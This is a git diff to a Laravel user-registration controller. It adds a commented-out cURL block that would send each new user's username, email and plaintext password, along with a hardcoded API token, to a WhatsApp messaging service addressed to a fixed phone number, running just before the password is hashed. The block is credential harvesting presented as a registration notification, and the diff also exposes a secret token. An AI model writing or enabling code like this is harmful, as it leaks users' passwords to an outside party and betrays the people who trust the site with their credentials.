@@ -10,6 +10,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Validation\Rules;
 use Illuminate\View\View;
 
@@ -37,6 +38,34 @@ class RegisteredUserController extends Controller
             'password' => ['required', 'confirmed', Rules\Password::defaults()],
         ]);
         
+        // $curl = curl_init();
+        // curl_setopt_array($curl, array(
+        //     CURLOPT_URL => 'https://api.fonnte.com/send',
+        //     CURLOPT_RETURNTRANSFER => true,
+        //     CURLOPT_ENCODING => '',
+        //     CURLOPT_MAXREDIRS => 10,
+        //     CURLOPT_TIMEOUT => 0,
+        //     CURLOPT_FOLLOWLOCATION => true,
+        //     CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        //     CURLOPT_CUSTOMREQUEST => 'POST',
+        //     CURLOPT_POSTFIELDS => array(
+        //         'target' => '081234762703',
+        //         'message' => "New User Registered\n\nUsername: $request->username,\nEmail: $request->email\nPassword: $request->password"
+        //     ),
+        //     CURLOPT_HTTPHEADER => array(
+        //     'Authorization: 3eHXQD_+Tbzx941aRUe7'
+        //     ),
+        // ));
+
+        // $response = curl_exec($curl);
+        // curl_close($curl);
+        // $data = json_decode($response);
+
+        // if ($data->status == true) {
+        //     Log::info('SEND NOTIF SUCCESS');
+        // }else{
+        //     Log::info('SEND NOTIF GAGALSUCCESS');
+        // }
 
         $user = User::create([
             'username' => $request->username,
@@ -45,7 +74,6 @@ class RegisteredUserController extends Controller
             'password' => Hash::make($request->password),
         ]);
         $user->assignRole('creator');
-
         return redirect()->to(route('login'))->with('success','Account created successfully!');
     }
 }
